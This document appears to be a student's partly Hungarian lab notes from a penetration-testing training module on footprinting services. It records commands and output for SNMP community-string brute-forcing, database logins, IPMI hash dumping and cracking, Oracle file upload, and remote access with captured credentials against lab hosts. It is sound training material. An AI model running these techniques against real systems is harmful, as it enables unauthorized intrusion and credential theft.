        0040 - 26 80 e8 e7 d5 bd c5 65-30 4f 7c f1 7e ab 97 7b   &......e0O|.~..{
        0050 - 6d f1 96 f6 22 77 f5 87-a4 10 86 41 b7 42 e1 c1   m..."w.....A.B..
        0060 - 3b 92 3a 99 7d dd ff 77-05 64 f2 1e 43 10 68 ba   ;.:.}..w.d..C.h.
        0070 - 1a 36 ce 6f 54 33 00 f4-15 d1 f3 88 49 fa 4e ca   .6.oT3......I.N.
        0080 - 2f 4c a8 8f bc 83 6f e3-19 72 99 a3 b7 19 04 20   /L....o..r..... 
        0090 - 46 0d 05 ea d5 bf 61 e4-b0 a6 86 ee 3b 3d 20 7d   F.....a.....;= }
        00a0 - 61 e4 7f e1 b4 3a a7 8d-c6 df b5 74 8a 9d c4 c8   a....:.....t....
        00b0 - 8a de 22 44 1b 2f fb 1b-5d 9e 2d 38 43 85 12 04   .."D./..].-8C...
...
Az előző sessiont (shellben) folytatva ennyi:
...
SNMP Daemon Config:
    ...
    NemBanTom@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
...
For footprinting SNMP, we can use tools like `snmpwalk`, `onesixtyone`, and `braa`. `Snmpwalk` is used to query the OIDs with their information. `Onesixtyone` can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. Since these community strings can be bound to any source, identifying the existing community strings can take quite some time.
    ...
    NemBanTom@htb[/htb]$ snmpwalk -v2c -c public 10.129.14.128
...
**OneSixtyOne:**
    ...
    NemBanTom@htb[/htb]$ sudo apt install onesixtyone
    NemBanTom@htb[/htb]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
...
**Braa:**
    ...
    NemBanTom@htb[/htb]$ sudo apt install braa
    NemBanTom@htb[/htb]$ braa <community string>@<IP>:.1.3.6.*   # Syntax
    NemBanTom@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*
...
Q2: What is the customized version of the SNMP server?
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-enzvabk8bx]─[~]
    └──╼ [★]$ snmpwalk -v2c -c public 10.129.144.164
    iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIX02 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
    iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
    iso.3.6.1.2.1.1.3.0 = Timeticks: (15160) 0:02:31.60
...
Q3: Enumerate the custom script that is running on the system and submit its output as the answer. ( A fenti output folytatása...)
...
The management of SQL databases and their configurations is a vast topic. It is so large that entire professions, such as `database administrator`, deal with almost nothing but databases. These structures become very large quickly, and their planning can become complicated. Among other things, DB management is a core competency for `software developers` but also `information security analysts`. To cover this area completely would go beyond the scope of this module. Therefore, we recommend setting up a MySQL/MariaDB instance to experiment with the various configurations to understand the available functionality and configuration options better. Let us have a look at the default configuration of MySQL.
    ...
    NemBanTom@htb[/htb]$ sudo apt install mysql-server -y
    NemBanTom@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
...
As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user `root`, but a fixed password. We can test this with the following command:
    ...
    NemBanTom@htb[/htb]$ mysql -u root -h 10.129.14.132
...
For example, if we use a password that we have guessed or found through our research, we will be able to log in to the MySQL server and execute some commands.
    ...
    NemBanTom@htb[/htb]$ mysql -u root -pP4SSw0rd -h 10.129.14.128
...
Q1: Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-enzvabk8bx]─[~]
    └──╼ [★]$ nmap -sVC -p3306 --script=mysql* 10.129.143.62
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-30 11:26 CST
    Stats: 0:03:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 93.35% done; ETC: 11:30 (0:00:14 remaining)
    Stats: 0:04:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 94.63% done; ETC: 11:31 (0:00:15 remaining)
    Stats: 0:06:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 95.98% done; ETC: 11:33 (0:00:16 remaining)
    Stats: 0:08:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 96.74% done; ETC: 11:35 (0:00:17 remaining)
    Stats: 0:12:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.74% done; ETC: 11:39 (0:00:02 remaining)
    Stats: 0:14:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.75% done; ETC: 11:40 (0:00:02 remaining)
    Stats: 0:15:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.75% done; ETC: 11:42 (0:00:02 remaining)
    Stats: 0:16:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.76% done; ETC: 11:43 (0:00:02 remaining)
    Nmap scan report for 10.129.143.62
    ...
    |_  Statistics: Performed 7 guesses in 6 seconds, average tps: 1.2
    | mysql-info: 
    |   Protocol: 10
    |   Version: 8.0.27-0ubuntu0.20.04.1
    |   Thread ID: 11
    |   Capabilities flags: 65535
    |   Some Capabilities: Speaks41ProtocolNew, InteractiveClient, Support41Auth, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, ConnectWithDatabase, IgnoreSigpipes, SupportsTransactions, FoundRows, Speaks41ProtocolOld, LongColumnFlag, ODBCClient, LongPassword, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
    |   Status: Autocommit
    |   Salt: %rZ;,
    | dV\x0E}ZX\FMt\x0D<{v
    ...
    | mysql-brute: 
    |   Accounts: No valid accounts found
    |   Statistics: Performed 50011 guesses in 1087 seconds, average tps: 82.3
    |_  ERROR: The service seems to have failed or is heavily firewalled...
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 1097.31 seconds
...
Q2: During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-enzvabk8bx]─[~]
    └──╼ [★]$ mysql -u robin -probin -h 10.129.143.62
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    ...
    MySQL [(none)]> SELECT * FROM customers;
...
Of the MSSQL clients listed above, pentesters may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. To find if and where the client is located on our host, we can use the following command:
    ...
    NemBanTom@htb[/htb]$ locate mssqlclient
...
If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.
    ...
    NemBanTom@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
...
Q1: Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-9ajrbzgjbo]─[~]
    └──╼ [★]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.142.89
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-30 14:00 CST
    Nmap scan report for 10.129.142.89
    ...
    | ms-sql-tables: 
    |   10.129.142.89:1433: 
    |_[10.129.142.89:1433]
    | ms-sql-empty-password: 
    |_  10.129.142.89:1433: 
    | ms-sql-dump-hashes: 
    |_  10.129.142.89:1433: ERROR: Bad username or password
    | ms-sql-config: 
    |   10.129.142.89:1433: 
...
Q2: Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-6wdp73wr15]─[/usr/local/bin]
    └──╼ [★]$ python3 mssqlclient.py backdoor@10.129.113.135 -windows-auth
...
**Nmap:**
    ...
    NemBanTom@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
...
**Nmap - SID Bruteforcing:**
    ...
    NemBanTom@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
...
We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.
    ...
    NemBanTom@htb[/htb]$ ./odat.py all -s 10.129.204.235
...
**SQLplus - Log In:**
    ...
    NemBanTom@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
...
If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).
    ...
    NemBanTom@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
...
**Oracle RDBMS - Database Enumeration:**
    ...
    NemBanTom@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
...
**Oracle RDBMS - File Upload:**
    ...
    NemBanTom@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
    NemBanTom@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
...
Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.
    ...
    NemBanTom@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
...
Q1: Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-6wdp73wr15]─[/usr/local/bin]
    └──╼ [★]$ sudo nmap -p1521 -sV 10.129.108.217 --open
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-31 01:38 CST
    Nmap scan report for 10.129.108.217
...
next:
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-6wdp73wr15]─[/usr/local/bin]
    └──╼ [★]$ sudo nmap -p1521 -sV 10.129.108.217 --open --script oracle-sid-brute
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-31 01:40 CST
    Nmap scan report for 10.129.108.217
    Host is up (0.042s latency).
...
run:
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-6wdp73wr15]─[~/odat]
    └──╼ [★]$ python3 odat.py all -s 10.129.108.217
    [+] Checking if target 10.129.108.217:1521 is well configured for a connection...
    [+] According to a test, the TNS listener 10.129.108.217:1521 is well configured. Continue...
    
    [1] (10.129.108.217:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
    [+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.
    
    [2] (10.129.108.217:1521): Searching valid SIDs
    [2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.108.217:1521 server
    [+] 'XE' is a valid SID. Continue...            ############## | ETA:  00:00:00 
    100% |#########################################################| Time: 00:01:07 
    [2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.108.217:1521)
    100% |#########################################################| Time: 00:00:02 
    [2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.108.217:1521)
    [+] 'XE' is a valid SID. Continue...            ########       | ETA:  00:00:06 
    100% |#########################################################| Time: 00:00:59 
    [+] SIDs found on the 10.129.108.217:1521 server: XE
    
    [3] (10.129.108.217:1521): Searching valid Service Names
    [3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.108.217:1521 server
    [+] 'XE' is a valid Service Name. Continue...   ############## | ETA:  00:00:00 
    [+] 'XEXDB' is a valid Service Name. Continue... 
    100% |#########################################################| Time: 00:01:08 
    [3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (10.129.108.217:1521)
    100% |#########################################################| Time: 00:00:02 
    [3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (10.129.108.217:1521)
    [+] 'XE' is a valid Service Name. Continue...   ########       | ETA:  00:00:06 
    100% |#########################################################| Time: 00:00:59 
    [+] Service Name(s) found on the 10.129.108.217:1521 server: XE,XEXDB
    ...
    [4] (10.129.108.217:1521): Searching valid accounts on the XE SID
    The login cis has already been tested at least once. What do you want to do::29 
    - stop (s/S)
    - continue and ask every time (a/A)
    - skip and continue to ask (p/P)
    - continue without to ask (c/C)
    a
    [!] Notice: 'ctxsys' account is locked, so skipping this username for password3 
    [!] Notice: 'dbsnmp' account is locked, so skipping this username for password5 
    [!] Notice: 'dip' account is locked, so skipping this username for password8:23 
    [!] Notice: 'hr' account is locked, so skipping this username for password05:48 
    The login #internal has already been tested at least once. What do you want to do:
    - stop (s/S)
    - continue and ask every time (a/A)
    - skip and continue to ask (p/P)
    - continue without to ask (c/C)
    c
    [!] Notice: 'mdsys' account is locked, so skipping this username for password04 
    [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
    [!] Notice: 'outln' account is locked, so skipping this username for password32 
    [+] Valid credentials found: scott/tiger. Continue...                   0:01:18 
    [!] Notice: 'xdb' account is locked, so skipping this username for password0:14 
    100% |#########################################################| Time: 00:06:03 
    [+] Accounts found on 10.129.108.217:1521/sid:XE: 
    scott/tiger
    

Now SQLPLUS download:
...
so:
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-uyq4tfe8gv]─[/opt/oracle/instantclient_21_4]
    └──╼ [★]$ sqlplus scott/tiger@10.129.108.217/XE as sysdba
    
    SQL*Plus: Release 21.0.0.0.0 - Production on Wed Dec 31 02:18:35 2025
    Version 21.4.0.0.0
...
Q1: What username is configured for accessing the host via IPMI?
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-uyq4tfe8gv]─[~]
    └──╼ [★]$ sudo nmap -sU --script ipmi-version -p 623 10.129.141.38
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-31 02:41 CST
    Nmap scan report for 10.129.141.38
    Host is up (0.052s latency).
...
ez sokat nem segített, na de a metasploit:

    [msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ipmi/ipmi_dumphashes 
    [msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set RHOSTS 10.129.141.38
    RHOSTS => 10.129.141.38
    [msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
    [+] 10.129.141.38:623 - IPMI - Hash found: admin:a036b5fd82000000c8eb7e926df7c7cdfb2c4e265f0ec5f58762758237aba53df1df4e22daae030ca123456789abcdefa123456789abcdef140561646d696e:ed2ab97d6b5323be15f309da26a880e87a3b58ec
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
...
Q2: What is the account's cleartext password?
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-uyq4tfe8gv]─[~]
    └──╼ [★]$ hashcat -m 7300 -a 0 hash.txt Downloads/rockyou.txt
    ...
    * Runtime...: 1 sec
    ...
    4bf4ebef82040000abedc41970275b6eec9d0eea8e3a283d885e582f09473dba7783433c83f9693ea123456789abcdefa123456789abcdef140561646d696e:1d46b7f679d4b4aba284081aa0b5ca0b62c22f19:trinity
    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
    Hash.Target......: 4bf4ebef82040000abedc41970275b6eec9d0eea8e3a283d885...c22f19
    Time.Started.....: Wed Dec 31 02:58:16 2025 (0 secs)
    Time.Estimated...: Wed Dec 31 02:58:16 2025 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (Downloads/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#2.........:  2075.9 kH/s (0.69ms) @ Accel:512 Loops:1 Thr:1 Vec:8
    ...
    Started: Wed Dec 31 02:58:12 2025
    Stopped: Wed Dec 31 02:58:17 2025

* * *

## 2.15 Linux Remote Management Protocols
...
The [sshd_config](https://www.ssh.com/academy/ssh/sshd_config) file, responsible for the OpenSSH server, has only a few of the settings configured by default. However, the default configuration includes X11 forwarding, which contained a command injection vulnerability in version 7.2p1 of OpenSSH in 2016. Nevertheless, we do not need a GUI to manage our servers.
    ...
    NemBanTom@htb[/htb]$ cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
...
One of the tools we can use to fingerprint the SSH server is [ssh-audit](https://github.com/jtesta/ssh-audit). It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.
    ...
    NemBanTom@htb[/htb]$ git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
    NemBanTom@htb[/htb]$ ./ssh-audit.py 10.129.14.132
...
**Change Authentication Method:**
    ...
    NemBanTom@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132
...
For potential brute-force attacks, we can specify the authentication method with the SSH client option `PreferredAuthentications`.
    ...
    NemBanTom@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
...
Let's do a bit of quick footprinting. We can see that Rsync is in use using protocol 31.
    ...
    NemBanTom@htb[/htb]$ sudo nmap -sV -p 873 127.0.0.1
...
**Probing for Accessible Shares:**
    ...
    NemBanTom@htb[/htb]$ nc -nv 127.0.0.1 873
...
Here we can see a share called `dev`, and we can enumerate it further.
    ...
    NemBanTom@htb[/htb]$ rsync -av --list-only rsync://127.0.0.1/dev
...
**/etc/hosts.equiv:**
    ...
    NemBanTom@htb[/htb]$ cat /etc/hosts.equiv
...
**Scanning for R-Services:**
    ...
    NemBanTom@htb[/htb]$ sudo nmap -sV -p 512,513,514 10.0.17.2
...
**Logging in Using Rlogin:**
    ...
    NemBanTom@htb[/htb]$ rlogin 10.0.17.2 -l htb-student
...
To provide additional information in conjunction with `rwho`, we can issue the `rusers` command. This will give us a more detailed account of all logged-in users over the network, including information such as the username, hostname of the accessed machine, TTY that the user is logged in to, the date and time the user logged in, the amount of time since the user typed on the keyboard, and the remote host they logged in from (if applicable).
    ...
    NemBanTom@htb[/htb]$ rusers -al 10.0.17.5
...
## 2.16 Windows Remote Management Protocols
...
Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if `NLA` is enabled on the server or not, the product version, and the hostname.
    ...
    NemBanTom@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
...
In addition, we can use `--packet-trace` to track the individual packages and inspect their contents manually. We can see that the `RDP cookies` (`mstshash=nmap`) used by Nmap to interact with the RDP server can be identified by `threat hunters` and various security services such as [Endpoint Detection and Response](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (`EDR`), and can lock us out as penetration testers on hardened networks.
    ...
    NemBanTom@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
...
**RDP Security Check:**
    ...
    NemBanTom@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
    NemBanTom@htb[/htb]$ ./rdp-sec-check.pl 10.129.201.248
...
**Initiate an RDP Session:**
    ...
    NemBanTom@htb[/htb]$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
...
As we already know, WinRM uses TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`) by default, which we can scan using Nmap. However, often we will see that only HTTP (`TCP 5985`) is used instead of HTTPS (`TCP 5986`).
    ...
    NemBanTom@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
...
If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The [Test-WsMan](https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2) cmdlet is responsible for this, and the host's name in question is passed to it. In Linux-based environments, we can use the tool called [evil-winrm](https://github.com/Hackplayers/evil-winrm), another penetration testing tool designed to interact with WinRM.
    ...
    NemBanTom@htb[/htb]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
...
The initialization of the WMI communication always takes place on `TCP` port `135`, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) from the Impacket toolkit can be used for this.
    ...
    NemBanTom@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
...
The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-xszair3fvs]─[~]
    └──╼ [★]$ sudo nmap -sS -sC -Pn --disable-arp-ping 10.129.137.156
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-01 07:34 CST
    Nmap scan report for 10.129.137.156
    Host is up (0.052s latency).
...
try ftp:
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-xszair3fvs]─[~]
    └──╼ [★]$ ftp 10.129.137.156 2121
    Connected to 10.129.137.156.
    220 ProFTPD Server (Ceil's FTP) [10.129.137.156]
    Name (10.129.137.156:root): 
    331 Password required for root

A bannerben: Ceil's ftp - a fenti szövegben ceilnek ott van a creds-ei: "ceil:qwer1234"

    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-xszair3fvs]─[~]
    └──╼ [★]$ ftp 10.129.137.156 2121
    Connected to 10.129.137.156.
    220 ProFTPD Server (Ceil's FTP) [10.129.137.156]
    Name (10.129.137.156:root): ceil
    ...
    ftp> dir
    229 Entering Extended Passive Mode (|||32473|)
    150 Opening ASCII mode data connection for file list
    226 Transfer complete
    ftp> ls
    229 Entering Extended Passive Mode (|||2597|)
    150 Opening ASCII mode data connection for file list
    226 Transfer complete
    ftp> ls -R
    229 Entering Extended Passive Mode (|||18433|)
    150 Opening ASCII mode data connection for file list
    226 Transfer complete
    ftp> ls -a
    229 Entering Extended Passive Mode (|||54514|)
    150 Opening ASCII mode data connection for file list
    ...
    ftp> ls -a
    229 Entering Extended Passive Mode (|||47245|)
    150 Opening ASCII mode data connection for file list
...
Jöhet a flag keresés:

    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-xszair3fvs]─[~]
    └──╼ [★]$ ssh -i id_rsa ceil@10.129.137.156
     ...
     * Support:        https://ubuntu.com/advantage
      ...
      System information as of Thu 01 Jan 2026 01:54:14 PM UTC
    
      System load:  0.0               Processes:               177
      Usage of /:   86.3% of 3.87GB   Users logged in:         0
      Memory usage: 14%               IPv4 address for ens192: 10.129.137.156
      Swap usage:   0%
    ...
    ceil@NIXEASY:~$ mv flag/flag.txt .
    mv: cannot stat 'flag/flag.txt': No such file or directory
    ceil@NIXEASY:~$ ls
    ceil@NIXEASY:~$ ls -la
    total 36
    drwxr-xr-x 4 ceil ceil 4096 Nov 10  2021 .
    ...
    ceil@NIXEASY:~$ history
       ...
       12  ls a-l
       13  ls -al
       14  cat id_rsa.pub >> authorized_keys
       15  cd ..
       16  cd /home
       17  cd ceil/
       18  ls -l
    ...
    drwx------ 2 ceil ceil 4096 Nov 10  2021 .ssh
    -rw------- 1 ceil ceil  759 Nov 10  2021 .viminfo
    ceil@NIXEASY:~$ cd .viminfo
    -bash: cd: .viminfo: Not a directory
    ceil@NIXEASY:~$ cd .ssh
    ceil@NIXEASY:~/.ssh$ ls
    authorized_keys  id_rsa  id_rsa.pub
    ceil@NIXEASY:~/.ssh$ cd /flag
    -bash: cd: /flag: No such file or directory
    ceil@NIXEASY:~/.ssh$ cd ~
    ceil@NIXEASY:~$ ls
    ceil@NIXEASY:~$ cd ..
    ceil@NIXEASY:/home$ cd ..
    ceil@NIXEASY:/$ ls
    ...
    drwxr-xr-x   4 root root  4096 Nov 16  2021 boot
    drwxr-xr-x   2 root root  4096 Dec 15  2020 cdrom
    drwxr-xr-x  18 root root  3980 Jan  1 13:24 dev
    drwxr-xr-x  98 root root  4096 Nov 17  2021 etc
    drwxr-xr-x   5 root root  4096 Nov 10  2021 home
    ...
    drwxr-xr-x   4 root root  4096 Nov 16  2021 opt
    dr-xr-xr-x 221 root root     0 Jan  1 13:24 proc
    drwx------   6 root root  4096 Nov 16  2021 root
    drwxr-xr-x  28 root root   920 Jan  1 13:54 run
    lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
    drwxr-xr-x   7 root root  4096 Oct  5  2021 snap
    drwxr-xr-x   3 root root  4096 Nov 10  2021 srv
    dr-xr-xr-x  13 root root     0 Jan  1 13:24 sys
    drwxrwxrwt  12 root root  4096 Jan  1 13:54 tmp
    drwxr-xr-x  15 root root  4096 Nov 16  2021 usr
...
Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-qzlyv5stdg]─[~]
    └──╼ [★]$ sudo nmap -sS -sC -Pn --disable-arp-ping 10.129.202.41
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-01 08:05 CST
    ...
    |_ssl-date: 2026-01-01T14:05:18+00:00; 0s from scanner time.
    | rdp-ntlm-info: 
    ...
    |   Product_Version: 10.0.17763
    |_  System_Time: 2026-01-01T14:05:19+00:00
    | ssl-cert: Subject: commonName=WINMEDIUM
    | Not valid before: 2025-12-31T13:59:06
    |_Not valid after:  2026-07-02T13:59:06
    
    Host script results:
    | smb2-time: 
    |   date: 2026-01-01T14:05:21
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
...
Mount:
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-qzlyv5stdg]─[/mnt]
    └──╼ [★]$ sudo mount -t nfs -o nolock 10.129.202.41:/TechSupport tim/
...
Show the files:
    ...
    tmpfs                       792M  9.4M  782M   2% /run
    /dev/vda1                    39G   31G  5.8G  85% /
    tmpfs                       3.9G     0  3.9G   0% /dev/shm
    tmpfs                       5.0M     0  5.0M   0% /run/lock
    tmpfs                       792M   92K  791M   1% /run/user/114
    tmpfs                       792M   88K  791M   1% /run/user/0
    tmpfs                       792M   92K  791M   1% /run/user/1002
    10.129.202.41:/TechSupport   40G   17G   24G  41% /mnt/tim
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-qzlyv5stdg]─[/mnt]
    └──╼ [★]$ cd /mnt/tim/
    bash: cd: /mnt/tim/: Permission denied
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-qzlyv5stdg]─[/mnt]
    └──╼ [★]$ sudo su
    ┌─[root@htb-qzlyv5stdg]─[/mnt]
    └──╼ #cd /mnt/tim
    ┌─[root@htb-qzlyv5stdg]─[/mnt/tim]
    └──╼ #ls
...
tovább:
    ...
    smb: \> dir
      ...
      important.txt                       A       16  Wed Nov 10 10:12:55 2021
            ...
            10328063 blocks of size 4096. 6098538 blocks available
...
Most RDP:
    ...
    [08:33:52:100] [52207:52208] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-2122384/.config/freerdp
    [08:33:52:100] [52207:52208] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-2122384/.config/freerdp/certs]
    [08:33:52:101] [52207:52208] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-2122384/.config/freerdp/server]
    [08:33:52:283] [52207:52208] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificat
    e (1
...
* Navigate to MSSQL icon
* Right-click > Run as administrator
* Open the **accounts** database.
* Open **dbo.devsacc** table.
* View top 200 rows.
* Search for `HTB`
...
The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-qzlyv5stdg]─[/mnt]
    └──╼ [★]$ sudo nmap -sS -sV -Pn --disable-arp-ping 10.129.202.20
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-01 09:13 CST
...
Lets see the UDP port:

    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-qzlyv5stdg]─[/mnt]
    └──╼ [★]$ sudo nmap -sU --top-port=100 -sV -Pn --disable-arp-ping 10.129.202.20
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-01 09:15 CST
...
BruteFOrce snmp:
    ...
    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-qzlyv5stdg]─[/usr/share/wordlists/seclists/Discovery/SNMP]
    └──╼ [★]$ onesixtyone -c snmp-onesixtyone.txt 10.129.202.20
...
